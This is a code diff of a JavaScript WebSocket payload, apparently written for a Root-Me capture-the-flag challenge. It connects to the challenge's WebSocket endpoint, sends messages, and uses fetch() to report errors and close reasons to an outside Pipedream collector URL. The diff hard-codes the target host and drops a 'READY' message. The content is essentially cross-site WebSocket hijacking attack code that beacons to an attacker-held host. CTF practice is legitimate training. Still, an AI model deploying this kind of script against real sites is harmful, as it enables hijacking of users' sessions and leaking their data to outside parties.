@@ -18,23 +18,20 @@
     }
 
     //launch connection
-    let origin = document.referrer.split('http://')[1];
-    var websocket = new WebSocket('ws://' + origin + '/ws');
+    var websocket = new WebSocket('ws://ctf29.root-me.org/ws');
     websocket.onopen = start;
       websocket.onmessage = handleReply;
     
     websocket.onerror = function (error) {
         fetch('https://eocvkn4m3kpce3q.m.pipedream.net?error=' + encodeURIComponent(error.message), {mode: 'no-cors'});
         setTimeout(() => {
-            websocket = new WebSocket('ws://' + origin + '/ws'); 
+            websocket = new WebSocket('ws://ctf29.root-me.org/ws'); 
         }, 5000);
     };
     websocket.onclose = function(message) {
         fetch('https://eocvkn4m3kpce3q.m.pipedream.net?close=' + encodeURIComponent(message.reason), {mode: 'no-cors'});
     }
       function start(event) {
-          //try to thing: retrieving the previous conv and retrieving the hello result
-          websocket.send("READY");
         websocket.send("hello");
       }
       function handleReply(event) {
